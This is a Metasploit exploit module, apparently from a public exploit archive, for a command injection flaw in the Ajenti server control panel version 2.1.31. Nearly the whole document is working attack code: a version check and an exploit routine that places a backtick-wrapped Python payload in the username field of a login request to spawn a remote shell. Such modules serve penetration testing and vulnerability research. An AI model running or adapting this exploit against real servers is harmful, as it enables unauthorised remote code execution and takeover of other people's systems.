# Exploit Author: Onur ER
# Vendor Homepage: http://ajenti.org/
# Software Link: https://github.com/ajenti/ajenti
# Version: 2.1.31
# Tested on: Ubuntu 19.10

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
                      &#039;Name&#039;            => "Ajenti 2.1.31 Remote Code Execution",
                      &#039;Description&#039;     => %q{
                        This module exploits a command injection in Ajenti <= 2.1.31.
                        By injecting a command into the username POST parameter to api/core/auth, a shell can be spawned.
                      },
                      &#039;Author&#039;          => [
                          &#039;Jeremy Brown&#039;, # Vulnerability discovery
                          &#039;Onur ER <onur@onurer.net>&#039; # Metasploit module
                      ],
                      &#039;References&#039;      => [
                          [&#039;EDB&#039;, &#039;47497&#039;]
                      ],
                      &#039;DisclosureDate&#039;  => &#039;2019-10-14&#039;,
                      &#039;License&#039;         => MSF_LICENSE,
                      &#039;Platform&#039;        => &#039;python&#039;,
                      &#039;Arch&#039;            => ARCH_PYTHON,
                      &#039;Privileged&#039;      => false,
                      &#039;Targets&#039;         => [
                          [ &#039;Ajenti <= 2.1.31&#039;, {} ]
                      ],
                      &#039;DefaultOptions&#039;  =>
                          {
                              &#039;RPORT&#039;   => 8000,
                              &#039;SSL&#039;     => &#039;True&#039;,
                          },
                      &#039;DefaultTarget&#039;   => 0
          ))
    register_options([
                         OptString.new(&#039;TARGETURI&#039;, [true, &#039;Base path&#039;, &#039;/&#039;])
    ])
  end

  def check
    res = send_request_cgi({
                               &#039;method&#039; => &#039;GET&#039;,
                               &#039;uri&#039;    => "/view/login/normal"
                           })
    if res and res.code == 200
      if res.body =~ /&#039;ajentiVersion&#039;, &#039;2.1.31&#039;/
        return Exploit::CheckCode::Vulnerable
      elsif res.body =~ /Ajenti/
        return Exploit::CheckCode::Detected
      end
    end
    vprint_error("Unable to determine due to a HTTP connection timeout")
    return Exploit::CheckCode::Unknown
  end


  def exploit
    print_status("Exploiting...")
    random_password = rand_text_alpha_lower(7)
    json_body = { &#039;username&#039; => "`python -c \"#{payload.encoded}\"`",
                  &#039;password&#039; => random_password,
                  &#039;mode&#039; => &#039;normal&#039;
    }
    res = send_request_cgi({
         &#039;method&#039; => &#039;POST&#039;,
         &#039;uri&#039;    => normalize_uri(target_uri, &#039;api&#039;, &#039;core&#039;, &#039;auth&#039;),
         &#039;ctype&#039;  => &#039;application/json&#039;,
         &#039;data&#039;   => JSON.generate(json_body)
     })
  end
end

